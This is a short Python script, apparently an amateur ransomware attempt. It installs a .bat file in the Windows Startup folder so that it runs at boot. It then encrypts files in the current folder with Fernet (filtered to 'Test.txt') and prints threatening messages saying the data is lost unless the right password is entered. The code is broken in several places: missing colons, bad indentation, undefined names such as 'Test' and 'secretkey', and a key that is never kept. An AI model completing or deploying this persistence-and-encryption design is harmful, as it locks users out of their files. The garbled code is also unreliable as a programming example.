import os
import sys
from cryptography.fernet import Fernet

files = []
key = 0
passkey = Test
code = 0

def autostart():
    # Path to Autostart
    autostart_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    # Name and Path of Shortcut
    shortcut_name = "m.bat"
    shortcut_path = os.path.join(autostart_folder, shortcut_name)

    # Creats .bat file in autosart ordner to run code at pc start
    with open(shortcut_path, 'w') as shortcut_file:
        #adds the order to start the programm at PC start
        shortcut_file.write(f'start "" "{sys.executable}" "{os.path.abspath(__file__)}"')

def encrypt()
    # Finds the files and adds them to a list
    for file in os.listdir():
#      if file == "main.py" :
#           continue
        #this is for beeing safe and it only attaks the Test 
       if file !="Test.txt":
            continue
      files.append(file)

    #Generate a key for encrypting the files
    key = fernet.generate_key()

    #encrypt the files
    for file in files
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

    #Give an Output to the User
    print("Your Files have been encrypted, they will decrypt after typing in the Password")
    print("When your Passwort is wrong your data is away")
    print("When you change the stuff standing in your Files, is gone too so dont do that")
    print("And if you try to restart your Pc its not decryptabel too")

def decrypt()
    code = input("Enter the password: ")
    if code == passkey:
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
    else:
        print("That was Wrong, Sorry Bro")
        
    
#Execute the definitions    
#if __name__ == '__main__':
#    autostart()
autostart()
encrypt()
decrypt()
